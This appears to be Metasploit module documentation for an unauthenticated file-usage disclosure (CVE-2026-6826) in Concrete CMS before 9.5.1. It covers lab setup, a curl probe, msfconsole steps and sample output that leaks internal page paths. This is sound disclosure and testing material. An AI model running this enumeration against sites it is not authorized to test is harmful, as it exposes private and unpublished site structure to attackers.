## Vulnerable Application

Concrete CMS (formerly concrete5) 9.x before **9.5.1** exposes the file usage dialog
controller at `/ccm/system/dialogs/file/usage/<fID>` without a view permission check
(**CVE-2026-6826**). Any unauthenticated caller can enumerate the numeric file ID space and,
for every file registered in the file manager, learn where the file is used: the referencing
Page ID, the page Version, the file Handle, and the page Location (path). This leaks the
site's internal page tree, including internal, draft, and unpublished page paths, and the
file handles, to anonymous users.

Fixed in Concrete CMS 9.5.1 by adding an authentication/permission check to the usage
controller.

### Setting up a test environment

1. Install Concrete CMS between 9.0.0 and 9.5.0 (for example 9.1.3).
2. Log in to the dashboard and upload a few files, then place at least one on a page so it
   has a usage record.
3. Log out. As an anonymous user, confirm the endpoint answers:
   ```
   curl -s 'http://TARGET/ccm/system/dialogs/file/usage/1'
   ```
   A vulnerable install returns an HTML table (`class="table table-striped"`) with the
   Page ID, Version, Handle, and Location columns.

## Verification Steps

1. `msfconsole`
2. `use auxiliary/scanner/http/concrete_cms_file_usage_disclosure`
3. `set RHOSTS <target>`
4. `set RPORT <port>` (and `set SSL true` for HTTPS)
5. (optional) `set FID_START 1` and `set COUNT 200` to widen the enumerated ID range
6. `run`
7. The module confirms the endpoint is anonymously reachable and prints the disclosed file
   usage records, saving them to loot as CSV.

## Options

### FID_START

First numeric file ID to request (default: 1).

### COUNT

Number of sequential file IDs to enumerate starting at `FID_START` (default: 50).

### TARGETURI

Base path to the Concrete CMS application (default: `/`).

## Scenarios

### Concrete CMS 9.1.3

```
msf6 > use auxiliary/scanner/http/concrete_cms_file_usage_disclosure
msf6 auxiliary(scanner/http/concrete_cms_file_usage_disclosure) > set RHOSTS 192.0.2.20
msf6 auxiliary(scanner/http/concrete_cms_file_usage_disclosure) > set COUNT 100
msf6 auxiliary(scanner/http/concrete_cms_file_usage_disclosure) > run

[+] 192.0.2.20:80 - Unauthenticated file usage dialog is exposed (CVE-2026-6826)
[+] 192.0.2.20:80 - Disclosed 3 file usage record(s)

  Concrete CMS file usage
  =======================
  File ID  Page ID  Version  Handle        Location
  -------  -------  -------  ------        --------
  1        1547     55       phone-guides  /!stacks/common/archive/phone-guides
  ...
[+] 192.0.2.20:80 - Loot saved to: /root/.msf4/loot/....._concrete_cms.file_usage_......csv
[*] Scanned 1 of 1 hosts (100% complete)
```

## Notes

- The module is read-only; it only issues GET requests to the usage dialog and never writes.
- Not every file ID is populated; gaps in the ID space simply return no usage row and are
  skipped. Widen `COUNT` to characterize the full file store.
